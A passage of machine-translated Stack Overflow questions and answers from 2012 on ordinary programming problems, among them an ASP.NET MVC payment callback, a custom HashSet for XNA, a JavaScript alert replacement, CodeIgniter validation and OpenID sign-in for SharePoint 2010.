1.  每页有时间限制吗？
2.  从他们登录开始是固定时间吗？
3.  是在会话被Java垃圾收集的时候吗？

在 1 的情况下，实现这一点的最简单方法是使用 javascript 在页面上设置超时（当用户导航到新屏幕时，超时将被丢弃），例如

```
setTimeout(function() {
    alert('5 minutes has expired since you got here - about to be logged out');
}, (300000)); // 5 minutes 
```

在第二种情况下，您仍将使用上述方法，但将 javascript 上的超时时间减少到服务器上已经花费的时间（使用 java 编写 javascript，或在登录时删除*包含*javascript 时间戳的 cookie）。

在第 3 种情况下......您真的无法知道用户何时会注销。

# asp.net-mvc-3 - 从 3rd 方站点发布到我的 ASP.NET MVC 应用程序

> ID：10246571
> 
> 赞同：3
> 
> 时间：2012-04-20T12:49:30.893
> 
> 标签：asp.net-mvc-3, http-post, payment-gateway

我正在测试支付提供商 (SagePay)，作为流程的一部分，他们的服务器会发布到我的站点并期望得到响应。我无法使用 MVC 让它工作。

我设置了一个经典的 asp 测试响应页面并将其添加到我的 MVC 应用程序中：

```
<%
Response.Buffer = True 
response.Clear()
response.contenttype="text/plain"
response.write "Status=OK" & vbCRLF
response.write "RedirectURL=http://www.redirectsomewhere.co.uk" & vbCRLF
response.End()
%> 
```

这工作很好。

但是，当我尝试对 MVC 执行相同操作时，它不起作用：

控制器：

```
[HttpPost]
public ActionResult TestCallback()
{
     return View();
} 
```

看法：

```
@{
    Response.Buffer = true;
    Response.Clear();
    Response.ContentType = "text/plain";
    Response.Write("Status=OK" + System.Environment.NewLine);
    Response.Write("RedirectURL=http://www.redirectsomewhere.co.uk" + System.Environment.NewLine);
    Response.End();
} 
```

该错误消息是来自支付提供商的一般错误，因此没有真正的帮助，但我已将错误范围缩小到页面呈现的点。

我可以很好地浏览两个页面（为此我需要从 MVC 控制器方法中删除 HttpPost 属性），并且两个页面都显示相同的数据。

这是支付提供商发布到的 MVC url：

```
http://myipaddress/CA_UAT/Token/TestCallback 
```

这是可以正常工作的经典 asp URL：

```
http://myipaddress/CA_UAT/Token/TestCallback.asp 
```

我为 asp 页面创建了一个“令牌”目录，以便 url 匹配以用于测试目的。

我究竟做错了什么？

**更新**

为了回应 Hari 的评论，我安装了一个名为“Header Spy”的 Firefox 插件，它为我提供了以下信息：

```
Response HTTP/1.1 200 OK
Source: Response
HttpHeader:Server
Request:User-Agent Cookie
Response:Response Date Set-Cookie 
```

两个页面显示相同的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T07:33:59.427

您无需返回操作结果即可将纯文本发送回屏幕。完成此操作的最简单方法是返回一个字符串值。将控制器中的代码替换为以下代码。

```
[HttpPost]
public string TestCallback()
{
  string result = "Status=OK";
  result += System.Environment.NewLine;
  result += "RedirectURL=http://www.redirectsomewhere.co.uk";
  result += System.Environment.NewLine;
  return result;
} 
```

这将不会返回您在字符串中的其他响应。通过使用 ActionResult 和 View，您可能会从主视图返回标记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T18:45:30.603

我不会在视图中编写响应，而是将其写在 action 方法中，如下所示：

```
[HttpPost]
public ActionResult TestCallback()
{
  Response.Buffer = true;
  Response.Clear();
  Response.ContentType = "text/plain";
  Response.Write("Status=OK" + System.Environment.NewLine);
  Response.Write("RedirectURL=http://www.redirectsomewhere.co.uk" + System.Environment.NewLine);
  Response.Flush();
  return new EmptyResult();
} 
```

返回 EmptyResult 时，您将确保 MVC 不会在响应中附加任何内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-30T15:49:03.010

我想知道 sagepay 是否期望文件扩展名..即在继承人方面进行某种 URL 验证。你知道你的 Action 是否被调用了吗？

还可以尝试添加一个路由，使您的 mvc URL 看起来像“TestCallback.asp”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T07:40:44.797

试试这样：

```
[HttpPost]
public ActionResult TestCallback()
{
    var sb = new StringBuilder();
    sb.AppendLine("Status=OK");
    sb.AppendLine("RedirectURL=http://www.redirectsomewhere.co.uk");
    return Content(sb.ToString(), "text/plain");
} 
```

或者以更 MVCish 的方式：

查看型号：

```
public class ResponseViewModel
{
    public string Status { get; set; }
    public string RedirectUrl { get; set; }
} 
```

然后是自定义操作结果：

```
public class StatusActionResult : ContentResult
{
    private readonly ResponseModel _model;
    public StatusActionResult(ResponseModel model)
    {
        _model = model;
    }

    public override void ExecuteResult(ControllerContext context)
    {
        var response = context.HttpContext.Response;
        response.ContentType = "text/plain";
        response.Write(string.Format("Status={0}{1}", _model.Status, Environment.NewLine));
        response.Write(string.Format("RedirectURL={0}", _model.RedirectUrl));
    }
} 
```

最后是您的控制器操作：

```
[HttpPost]
public ActionResult TestCallback()
{
    var model = new ResponseModel
    {
        Status = "OK",
        RedirectUrl = "http://www.redirectsomewhere.co.uk"
    };
    return new StatusActionResult(model);
} 
```

# c# - C# HashSet2 与标准 C# HashSet 完全一样工作，而不是编译

> ID：10246572
> 
> 赞同：2
> 
> 时间：2012-04-20T12:49:32.963
> 
> 标签：c#, collections, xna, hashset, xbox

我正在使用字典创建自己的 HashSet，它作为标准 HashSet 工作。我这样做是因为 XNA XBox 的 C# 不支持 HashSet。

此代码基于我找到的示例中的代码。我已经编辑了示例以解决一些问题，但它仍然无法编译。

```
public class HashSet2<T> : ICollection<T>
{
    private Dictionary<T, Int16> dict;

    // code has been edited out of this example
    // see further on in the question for the full class

    public IEnumerator<T> GetEnumerator()
    {
        throw new NotImplementedException();
    }

    IEnumerator<T> IEnumerable<T>.GetEnumerator()
    {
        return dict.GetEnumerator();
    }
} 
```

.

```
'HashSet2<T>' does not implement interface member
'System.Collections.IEnumerable.GetEnumerator()'.
'HashSet2<T>.GetEnumerator()' cannot implement
'System.Collections.IEnumerable.GetEnumerator()'
because it does not have the matching return type of
'System.Collections.IEnumerator' 
```

如果它的行为偏离或它以可能出乎意料的方式实现的内容，我也将感谢有关将其修复为更像标准 HashSet 的信息。

续：[stackoverflow.com/questions/9966336/c-sharp-xna-xbox-hashset-and-tuple](https://stackoverflow.com/questions/9966336/c-sharp-xna-xbox-hashset-and-tuple)

该类的最新版本：

```
public class HashSet2<T> : ICollection<T>
{
    private Dictionary<T, Int16> dict;
    // Dictionary<T, bool>

    public HashSet2()
    {
        dict = new Dictionary<T, short>();
    }

    public HashSet2(HashSet2<T> from)
    {
        dict = new Dictionary<T, short>();
        foreach (T n in from)
            dict.Add(n, 0);
    }

    public void Add(T item)
    {
        // The key of the dictionary is used but not the value.
        dict.Add(item, 0);
    }

    public void Clear()
    {
        dict.Clear();
    }

    public bool Contains(T item)
    {
        return dict.ContainsKey(item);
    }

    public void CopyTo(
        T[] array,
        int arrayIndex)
    {
        throw new NotImplementedException();
    }

    public bool Remove(T item)
    {
        return dict.Remove(item);
    }

    public System.Collections.IEnumerator GetEnumerator()
    {
        return ((System.Collections.IEnumerable)
            dict.Keys).GetEnumerator();
    }

    IEnumerator<T> IEnumerable<T>.GetEnumerator()
    {
        return ((IEnumerable<T>)
            dict.Keys).GetEnumerator();
    }

    public int Count
    {
        get {return dict.Keys.Count;}
    }

    public bool IsReadOnly
    {
        get {return false;}
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:21:12.290

关键是 HashSet 的`GetEnumerator`返回枚举器枚举类型的**键**`T`，而字典的`GetEnumerator`返回枚举器枚举 KeyValue 对象。

# 更新

将其更改为以下内容：

```
public IEnumerator GetEnumerator()
{
    dict.Keys.GetEnumerator();
}

IEnumerator<T> IEnumerable<T>.GetEnumerator()
{
    return dict.Keys.GetEnumerator();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T14:12:04.360

您想枚举键，而不是字典。试试这个：

```
public IEnumerator GetEnumerator()
{
    return ((IEnumerable)dict.Keys).GetEnumerator();
}

IEnumerator<T> IEnumerable<T>.GetEnumerator()
{
    return ((IEnumerable<T>)dict.Keys).GetEnumerator();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T13:22:38.977

您可以简单地使用 Mono 的`HashSet<T>`. 您可能需要对 .net 进行一些小的更改`#if`或删除一些接口/属性，但它适用于 .net。

它使用的是允许的 MIT X11 许可证。[https://github.com/mono/mono/blob/master/mcs/class/System.Core/System.Collections.Generic/HashSet.cs](https://github.com/mono/mono/blob/master/mcs/class/System.Core/System.Collections.Generic/HashSet.cs)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T14:40:50.017

刚刚看了一下源码，GetEnumerator 的所有实现都在`Dictionary<TKey, TValue>`返回`KeyCollection.Enumerator`/`ValueCollection.Enumerator`对象而不是`IEnumerator<T>`（这是我们需要的）。好消息是`Key/ValueCollation.Enumerator`实现了接口`System.Collection.IEnumerator`和`IEnumerator<T>`接口，因此您可以安全地转换为这些类型。

尝试这样做：

```
public IEnumerator GetEnumerator()
{
    return (IEnumerator)dict.Keys.GetEnumerator();
}

IEnumerator<T> IEnumerable<T>.GetEnumerator()
{
    return (IEnumerator<T>)dict.Keys.GetEnumerator();
} 
```

# asp.net - 如何读取下拉列表中选择的 indexchanged 事件中的 Hashtable 键和值

> ID：10246574
> 
> 赞同：-1
> 
> 时间：2012-04-20T12:49:42.743
> 
> 标签：asp.net, c#-4.0, hashtable

我有 ddlModalityList 下拉列表.. 选择 ddlModalityList.. 我必须在另一个下拉列表中填充相应的选定研究。

```
 protected void Page_Load(object sender, EventArgs e)
        {
        var dictionery = new Dictionary<int, string>();

                foreach (DataRow dr in dataTableAcqModality.Rows)

 {
                ModalityID = Convert.ToInt32(dr["Modality_ID"]);
                strModality = dr["Modality"].ToString();
                strSchStaAETitle = dr["Scheduled_Station_AE_Title"].ToString();
                strSchStaName = dr["SCHEDULED_STATION_NAME"].ToString();
                strDdlModality = strModality + "(" + strSchStaAETitle + "|" + strSchStaName + ")";

                dictionery.Add(ModalityID, strDdlModality);
            }

            ddlModalityList.DataTextField = "Value";
            ddlModalityList.DataValueField = "Key";
            ddlModalityList.DataSource = dictionery;
            ddlModalityList.DataBind();
}

    protected void ddlModalityList_SelectedIndexChanged(object sender, EventArgs e)
        { 
             Dictionary<int, string> selectedPair = (Dictionary<int,string>)ddlModalityList.SelectedItem;
} 
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T10:17:35.230

```
protected void ddlModalityList_SelectedIndexChanged(object sender, EventArgs e)
        {     
             ListItem selectedPair = ddlModalityList.SelectedItem;
        } 
```

# asp.net-mvc - 如何从 mvc3 中的 Session 对象中检索值？

> ID：10246576
> 
> 赞同：0
> 
> 时间：2012-04-20T12:49:49.293
> 
> 标签：asp.net-mvc, asp.net-mvc-3, entity-framework, stored-procedures

我有 mvc 3 应用程序，其中在会话对象中我将我需要的所有值作为参数来执行存储过程。

如果 userAction 是更新，则执行存储过程。

```
public ActionResult Index(string userAction) 
{ 
   if(Session["Mappings"] != null)            
        ViewData["Message"] = "Mapping web grid"; 

    if (Session["PricingSecurities"] == null) 
        Session["PricingSecurities"] = objRepository.GetPricingSecurityID(); 
    if (Session["Cusips"] == null) 
        Session["Cusips"] = objRepository.GetCUSIP(); 

    SecurityMappingModel objModel = null; 
    mappings = (List<SecurityMappingModel>)Session["Mappings"]; 

    objModel = new SecurityMappingModel(); 

    if (userAction == "Update" ) 
    { 
        //please tell me how can i take values from Session[Mappings] and pass it to stored procedure? 
        //i'm trying this code
        //foreach (var item in Session)
        //{objModel.Cusips = (List<SelectListItem>)Session["Mappings"];
        //I did function import here (import my sp in model)using EF name            
        //ExecuteMappingsp.
        //dbContext.ExecuteMappingsp(need to pass parameter);
        //} //i know wrong code but how to fix this??
        // PLEASE HELP ME TO RETRIEVE SESSION VALUES
        return RedirectToAction("Index"); 
    } 
    objModel.PricingSecirities = (List<SelectListItem>)Session["PricingSecurities"]; 
    objModel.Cusips = (List<SelectListItem>)Session["Cusips"]; 
    ViewBag.Mappings = mappings; 
    return View(objModel); 
} 
```

如何从 Session[Mappings] 中获取值并将其传递给存储过程？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:52:54.553

### 描述

Entity Framework Code First 目前不支持存储过程调用。目前，唯一的方法是使用`SqlCommand`. （System.Data.SqlClient 命名空间）

### 样本

```
// ....
if (userAction == "Update")
{
    // Create SqlCommand with your stored procedure name and sql connectionstring
    SqlCommand cmd = new SqlCommand("dbo.StoredProcedureName", new SqlConnection("ConnectionString"));
    // set the command type to StoredProcedure
    cmd.CommandType = System.Data.CommandType.StoredProcedure;
    // Add Parameters
    cmd.Parameters.Add("@ParameterName", Session[Mappings]);
    // execute the stored procedure
    cmd.ExecuteNonQuery();

    return RedirectToAction("Index");
} 
```

### 更多信息

*   [MSDN - 通过命令使用存储过程](http://msdn.microsoft.com/en-us/library/yy6y35y8%28v=VS.71%29.aspx)

## 更新

我不知道您的模型，如果它是代码优先，数据库优先还是 shema 优先，因为您没有提供该信息。但也许这有帮助

```
foreach (var item in (List<SelectListItem>)Session["Mappings"])
{
   dbContext.ExecuteMappingsp(PassInTheParametersYouNeedFromYourItem)
} 
```

# cxf - 带有 CXF 的 JAX-RS / 放心：处理多参数文件上传

> ID：10246579
> 
> 赞同：2
> 
> 时间：2012-04-20T12:50:16.627
> 
> 标签：cxf, jax-rs, rest-assured

我想上传一个 JPG 文件和一个 JSON 序列化的 Java 对象。在我使用 Apache CXF 的服务器上，在客户端上我正在使用[rest-assured](http://code.google.com/p/rest-assured/)进行集成测试。

我的服务器代码如下所示：

```
@POST
@Path("/document")
@Consumes(MediaType.MULTIPART_FORM_DATA)
public Response storeTravelDocument(
        @Context UriInfo uriInfo, 
        @Multipart(value = "document") JsonBean bean,
        @Multipart(value = "image") InputStream pictureStream)
        throws IOException
{} 
```

我的客户端代码如下所示：

```
given().
    multiPart("document", new File("./data/json.txt"), "application/json").
    multiPart("image", new File("./data/image.txt"), "image/jpeg").
expect().
    statusCode(Response.Status.CREATED.getStatusCode()).
when().
    post("/document"); 
```

当我从文件中读取 json 部分时，一切正常，就像在第一个 multiPart 行中一样。但是，当我想序列化 json 实例时，我遇到了问题。我尝试了许多变体，但没有一个有效。

我认为这个变体应该可以工作：在客户端

```
JsonBean json = new JsonBean();
json.setVal1("Value 1");
json.setVal2("Value 2");

given().
    contentType("application/json").
    formParam("document", json).
    multiPart("image", new File("./data/image.txt"), "image/jpeg").
... 
```

并在服务器上

```
public Response storeTravelDocument(
    @Context UriInfo uriInfo, 
    @FormParam(value = "document") JsonBean bean,
    @Multipart(value = "image") InputStream pictureStream) 
```

但不是。谁能告诉我应该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T12:39:23.773

尝试不同的方法（对我有用），我不确定这是否适合您的情况。

使 JsonBean 成为 JAXB 实体，它在类定义上方添加 @XmlRootEntity。

然后，而不是 formParam

```
given().
    contentType("application/json").
    body(bean). //bean is your JsonBean
    multiPart("image", new File("./data/image.txt"), "image/jpeg"). 
```

然后

```
public Response storeTravelDocument(
    @Context UriInfo uriInfo, 
    JsonBean bean, //should be deserialized properly
    @Multipart(value = "image") InputStream pictureStream) 
```

我从来没有用@Multipart 部分尝试过，但是，希望它会起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T14:24:37.940

Multipart/form-data 遵循多部分 MIME 数据流的规则，参见[w3.org](http://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.2)。这意味着请求的每个部分都构成流中的一部分。放心支持已经很简单的字段（字符串）、文件和流，但不支持将对象序列化为部分。在邮件列表上询问后，Johan Haleby（放心的作者）建议添加一个问题。该问题已被接受，请参阅[问题 166](http://code.google.com/p/rest-assured/issues/detail?id=166)。

服务器将保持原样：

```
@POST
@Path("/document")
@Consumes(MediaType.MULTIPART_FORM_DATA)
public Response storeTravelDocument(
        @Context UriInfo uriInfo, 
        @Multipart(value = "document") JsonBean bean,
        @Multipart(value = "image") InputStream pictureStream)
        throws IOException
{} 
```

客户端代码将如下所示：

```
given().
    multiPartObject("document", objectToSerialize, "application/json").
    multiPart("image", new File("./data/image.txt"), "image/jpeg").
expect().
    statusCode(Response.Status.CREATED.getStatusCode()).
when().
    post("/document"); 
```

也许名称“multiPartObject”会改变。我们将看到它一旦实施。

# javascript - 在 JavaScript 中睡觉？

> ID：10246581
> 
> 赞同：-1
> 
> 时间：2012-04-20T12:50:28.137
> 
> 标签：javascript, jquery

> **可能重复：**
> [在 Javascript 中休眠](https://stackoverflow.com/questions/758688/sleep-in-javascript)

我想在 JavaScript 中创建一个**睡眠**功能，我必须在用户执行操作之前停止任何代码执行（例如 alert() 行为）

我需要的正是：我应该在此处插入什么以使其工作？

```
window.alert = function(message){
    var dialog = $('<div>'+message+'</div>').dialog({
        title:'Alert',

        buttons:{
            'Ok': function(){
                $(this).dialog('close').data('open', false);
                $(this).remove();
            }
        }
    }).data('open', true);
    //What to insert here?
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:52:27.273

[jQuery 延迟](http://api.jquery.com/?s=deferred)是最好的方法。它提供了一个很好的回调框架，以便更容易维护回调。

我做了一个新功能，因为有些浏览器可能不允许你重新定义`alert`.

```
myAlert = function(message){
var dfd = new $.Deferred();

var dialog = $('<div>'+message+'</div>').dialog({
    title:'Alert',

    buttons:{
        'Ok': function(){
            $(this).dialog('close').data('open', false);
            $(this).remove();
            dfd.resolve();
        }
    }
}).data('open', true);
return dfd.promise();
} 
```

然后

```
myAlert(message).done(function() { callback here }); 
```

如果你想要你评论的内容，那就是这样。

```
myAlert(1).done(function() { myAlert(2) }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:56:06.023

您应该在这里使用回调，因为如果您停用 javascript，用户将无法单击“确定”

```
window.alert = function(message, callback){
    var dialog = $('<div>'+message+'</div>').dialog({
        title:'Alert',

        buttons:{
            'Ok': function(){
                $(this).dialog('close').data('open', false);
                $(this).remove();
                typeof callback=='function' && callback(); //check if callback, and execute it
            }
        }
    }).data('open', true);
}
alert('test',function(){console.log('The user has clicked on the ok');}); 
```

**编辑：**

如果您只想暂停`alert`执行而不是其他代码执行，您可以执行以下操作（我没有尝试过，但想法就在这里）：

```
var alertStack=[];
window.alert = function(message){
  if(!message || !alertStack.length)
    $('<div>'+(alertStack[0] || message)+'</div>').dialog({
      title:'Alert',

      buttons:{
        'Ok': function(){
          alertStack.shift()
          $(this).dialog('close').data('open', false);
          $(this).remove();
          alertStack.length && alert();
        }
      }
    }).data('open', true);

  message && alertStack.push(message);
}
alert('test');
alert('test2');
alert('test3'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T12:58:08.183

当您想推迟执行代码但又不想重复执行时，请使用 setTimeout()。

# c++ - 如何从 Visual Studio、C++ 中的表单之间继承变量

> ID：10246587
> 
> 赞同：0
> 
> 时间：2012-04-20T12:50:44.177
> 
> 标签：c++, forms, c++-cli

所以我正在使用 Windows 窗体，我偶然发现了一个问题，当我按下一个按钮时，一个名为 Form2 的窗体打开并且 Form1 隐藏了。但问题是我需要从 Form1 继承一个整数变量到 Form2，但我不能弄清楚如何做到这一点......我试图让Form2类继承Form1，但这使得Form2拥有所有控件（文本框，标签等）。那么正确的方法是什么？Maby 我错误地创建了 Form2 ......

以下是表单类的编写方式。

```
public ref class Form2 : public System::Windows::Forms::Form
{

public ref class Form1 : public System::Windows::Forms::Form
{ 
```

我试过了

```
 public ref class Form2 : public System::Windows::Forms::Form, public Form1
{ 
```

感谢关注！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:55:18.113

不允许从两个基类继承。您只能从一个类继承，但可以根据需要实现任意数量的接口。试试这样：

```
public ref class Form2 : public Form1 
{ 
```

在您的情况下，您不需要从两个类继承，因为 Form1 已经继承 System.Windows.Forms.Form，如果 Form2 继承 Form1，它也自动属于 System.Windows.Forms.Form 类型。

如果这只是两种形式应该共有的一个变量而没有别的，为什么要使用继承？因为继承通常意味着扩展基类，以便 Form1 的所有成员/属性/方法在 Form2 中也可用。因为表单必须从 System.Windows.Forms.Form 继承，所以您不能使用任何其他基类。也许您应该考虑使用将公共变量定义为属性的公共接口，然后两种形式都必须实现该接口。

```
public interface IMyForm
{
    int MyValue { get; set; }
}

public class Form1 : System.Windows.Forms.Form, IMyForm
{
   public int MyValue { get; set; }
   ...
}

public class Form2 : System.Windows.Forms.Form, IMyForm
{
   public int MyValue { get; set; }
   ...
} 
```

对不起 C# 语法，希望我的意思很清楚。例如，如果您现在有一个方法需要一个具有该公共属性的表单作为参数，您可以简单地执行以下操作：

```
public void DoSomething(IMyForm form)
{
    form.MyValue = 5;
} 
```

您可以将 Form1 或 Form2 的实例作为参数传递。

# asp.net-mvc - 编辑 Razor 视图的视图模板

> ID：10246590
> 
> 赞同：1
> 
> 时间：2012-04-20T12:50:57.813
> 
> 标签：asp.net-mvc, visual-studio-2010, asp.net-mvc-3, razor

我正在使用剃刀视图引擎编写 Web 应用程序。在 Visual Studio 中，我有机会通过右键单击项目资源管理器中的“视图”文件夹来使用向导创建视图。我可以检查“创建强类型视图”，选择模型类和模板（例如 Empty、List、Create、Delete...）。好东西。

我想知道如何编辑模板（更改语言、css 样式......）。

默认创建模板如下所示：

```
 @model UsedModel

 @{
     ViewBag.Title = "DefaultTemplate";
     Layout = "~/Views/Shared/_Layout.cshtml";
 }

 <h2>DefaultTemplate</h2>

 <script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
 <script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>

 @using (Html.BeginForm()) {
     @Html.ValidationSummary(true)
     <fieldset>
         <legend>UsedModel</legend>

         <p>
             <input type="submit" value="Create" />
         </p>
     </fieldset>
 }

 <div>
     @Html.ActionLink("Back to List", "Index")
 </div> 
```

那么如何自定义这个模板呢？

在此先感谢托比

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:00:18.423

这是一个我相信您正在寻找答案的 SO 问题： [如何在 Visual Studio 2010 中编辑默认 Razor Creat/Edit 脚手架](https://stackoverflow.com/questions/6894077/how-do-i-edit-default-razor-creat-edit-scaffolding-in-visual-studio-2010)

您可以将 T4​​ 文件复制到您的项目中并编辑它们（推荐）或修改它们以供所有项目使用（我建议不要这样做）。

# iphone - 是否可以在 iPhone 上录制/重放一组触摸事件以用于演示目的？

> ID：10246592
> 
> 赞同：3
> 
> 时间：2012-04-20T12:50:59.173
> 
> 标签：iphone, ios, demo, user-interaction

我正在考虑一种方法来包含我的 iPhone 应用程序如何与该应用程序一起工作的演示。我需要演示一个屏幕上的 GMGridView 控件是如何工作的。

是否可以记录或以编程方式创建一组长按、触摸移动、触摸结束事件，然后在界面上调用它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T16:59:35.307

我建议这样做：

1.  按下屏幕时添加视觉点击效果录制自己
2.  在模拟器上使用 App 使用屏幕截图 添加视频
3.  教程屏幕上的播放器，显示如何使用该应用程序

如果您不想添加视频播放器，也可以按照上述步骤创建 UIView 动画。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T17:03:03.777

一个很好的方法是 SIKULI 工具。您可以轻松地自动化演示工作流程：http: [//sikuli.org/](http://sikuli.org/)

# php - 在中文文本语料库中搜索仅包含特定字符的句子

> ID：10246594
> 
> 赞同：1
> 
> 时间：2012-04-20T12:51:03.727
> 
> 标签：php, parsing, search, pattern-matching, cjk

目的：在数以万计的中文句子数组中进行搜索，以找到仅包含“已知字符”数组中的字符的句子。

例如：假设我的语料库包含以下句子：1）我去中国。2）你爱他。3）你在哪里？我只“知道”或想要只包含这些字符的句子：1）我 2）中 3) 国 4) 你 5) 在 6) 去 7) 爱 8) 哪 9) 里。第一个句子将作为结果返回，因为它的所有三个字符都在我的第二个数组中。第二句会被拒绝，因为我没有要求你或他。第三句将作为结果返回。标点符号被忽略（以及任何字母数字字符）。

我有一个可以执行此操作的工作脚本（如下）。我想知道这是否是一种有效的方法。如果您有兴趣，请查看并提出更改建议，自己编写或提供一些建议。我从[这个脚本](http://www.der-patriotische-kapitalist.de/de/node/14)中收集了一些并检查了一些 stackoverflow 问题，但他们没有解决这种情况。

```
<?php
$known_characters = parse_file("FILENAME") // retrieves target characters
$sentences = parse_csv("FILENAME"); // retrieves the text corpus

$number_wanted = 30; // number of sentences to attempt to retrieve

$found = array(); // stores results
$number_found = 0; // number of results
$character_known = false; // assume character is not known
$sentence_known = true; // assume sentence matches target characters

foreach ($sentences as $s) {

    // retrieves an array of the sentence
    $sentence_characters = mb_str_split($s->ttext);

    foreach ($sentence_characters as $sc) {
        // check to see if the character is alpha-numeric or punctuation
        // if so, then ignore.
        $pattern = '/[a-zA-Z0-9\s\x{3000}-\x{303F}\x{FF00}-\x{FF5A}]/u';
        if (!preg_match($pattern, $sc)) {
            foreach ($known_characters as $kc) {;
                if ($sc==$kc) {
                    // if character is known, move to next character
                    $character_known = true;
                    break;
                }
            }
        } else {
            // character is known if it is alpha-numeric or punctuation
            $character_known = true;
        }
        if (!$character_known) {
            // if character is unknown, move to next sentence
            $sentence_known = false;
            break;
        }
        $character_known = false; // reset for next iteration
    }
    if ($sentence_known) {
        // if sentence is known, add it to results array
        $found[] = $s->ttext;
        $number_found = $number_found+1;
    }
    if ($number_found==$number_wanted)
        break; // if required number of results are found, break

    $sentence_known = true; // reset for next iteration 
}
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:58:46.463

在我看来这应该这样做：

```
$pattern = '/[^a-zA-Z0-9\s\x{3000}-\x{303F}\x{FF00}-\x{FF5A}我中国你在去爱哪里]/u';
if (preg_match($pattern, $sentence) {
    // the sentence contains characters besides a-zA-Z0-9, punctuation
    // and the selected characters
} else {
    // the sentence contains only the allowed characters
} 
```

确保将源代码文件保存为 UTF-8。

# validation - Codeigniter 验证库扩展不起作用

> ID：10246599
> 
> 赞同：2
> 
> 时间：2012-04-20T12:51:13.650
> 
> 标签：validation, codeigniter

我扩展了 CI 表单验证库，如下所示：

```
class MY_Form_validation extends CI_Form_validation {

    function __construct($config = array())
    {
        parent::__construct($config);
    }

    function check_first_char($str) 
    {
        $CI =& get_instance();
        $first_char = substr($str, 0, 1);
        if ($first_char != 'P' || $first_char != 'S') 
        {
            $CI->form_validation->set_message('check_first_char', 'The %s field must begin with P or S!');
            return FALSE;
        }
        else {
            return TRUE;
        }
    } 
```

并像下面这样调用它：

```
$this->form_validation->set_rules('sponsor_id', 'Sponsor ID', 'trim|required|exact_length[7]|check_first_char'); 
```

但它不起作用。我做错了什么？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-20T22:12:26.690

```
$this->form_validation->set_rules('sponsor_id', 'Sponsor ID', 'trim|required|exact_length[7]|callback_check_first_char'); 
```

如果我没记错的话，你需要'callback_'

来源：[http ://codeigniter.com/user_guide/libraries/form_validation.html](http://codeigniter.com/user_guide/libraries/form_validation.html)

编辑：您还需要初始化 form_validation 库。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-20T19:19:53.207

确保在控制器中初始化库：

```
$this->load->library('form_validation'); 
```

# sharepoint-2010 - 在 SharePoint 2010 中验证没有密码的表单用户

> ID：10246601
> 
> 赞同：1
> 
> 时间：2012-04-20T12:51:25.673
> 
> 标签：sharepoint-2010, forms-authentication, dotnetopenauth, claims-based-identity, fba

我正在为 SharePoint 2010 开发一个小项目，该项目将允许用户使用他们的 OpenID 进行身份验证（以后可能还会更多）。

它目前的工作方式是我有一个基于 SQL 的成员资格和角色提供程序。我的登录页面使用 DotNetOpenAuth 向 OpenID 端点发送身份验证请求。如果我得到肯定的响应，我会从 OpenID 角色读取电子邮件地址，并为具有该电子邮件地址的 MembershipUser 创建一个会话（如果我知道他来自的端点）。如果该用户不存在，我将创建一个新的 MembershipUser 并将端点存储在评论属性中（这样您就不能简单地编辑自己的角色以作为另一个人的电子邮件地址登录）。

这可行，但问题在于创建会话。我目前使用以下代码执行此操作：

```
//authenticate
SecurityToken token = SPSecurityContext.SecurityTokenForFormsAuthentication(new Uri(SPContext.Current.Web.Url),userProvider,roleProvider,username,user.GetPassword());         
SPFederationAuthenticationModule.Current.SetPrincipalAndWriteSessionToken(token); 
```

但是，只有在会员提供者不加密密码时，该位才有效，因为一旦加密，我就不能只读取用户的密码并在该方法中使用它。

我希望找到一种让用户登录的方法，但我似乎找不到一种简单的方法来做到这一点。

使用

```
FormsAuthentication.SetAuthCookie(username, false); 
```

只是创建一个异常（我认为这是因为该方法适用于标准 FBA，而不是基于声明的 FBA，但我只是在猜测。带有用户名和密码的内置 FBA 登录控件确实有效。）

```
System.ArgumentException: Exception of type 'System.ArgumentException' was thrown.  Parameter name: encodedValue   
 at Microsoft.SharePoint.Administration.Claims.SPClaimEncodingManager.DecodeClaimFromFormsSuffix(String encodedValue)    
 at Microsoft.SharePoint.Administration.Claims.SPClaimProviderManager.GetProviderUserKey(String encodedSuffix)    
 at Microsoft.SharePoint.SPGlobal.CreateSPRequestAndSetIdentity(SPSite site, String name, Boolean bNotGlobalAdminCode, String strUrl, Boolean bNotAddToContext, Byte[] UserToken, String userName, Boolean bIgnoreTokenTimeout, Boolean bAsAnonymous)    
 at Microsoft.SharePoint.SPWeb.InitializeSPRequest()    
 at Microsoft.SharePoint.WebControls.SPControl.EnsureSPWebRequest(SPWeb web)    
 at Microsoft.SharePoint.WebControls.SPControl.SPWebEnsureSPControl(HttpContext context)    
 at Microsoft.SharePoint.ApplicationRuntime.BaseApplication.Application_PreRequestHandlerExecute(Object sender, EventArgs e)    
 at Microsoft.SharePoint.ApplicationRuntime.SPRequestModule.PreRequestExecuteAppHandler(Object oSender, EventArgs ea)    
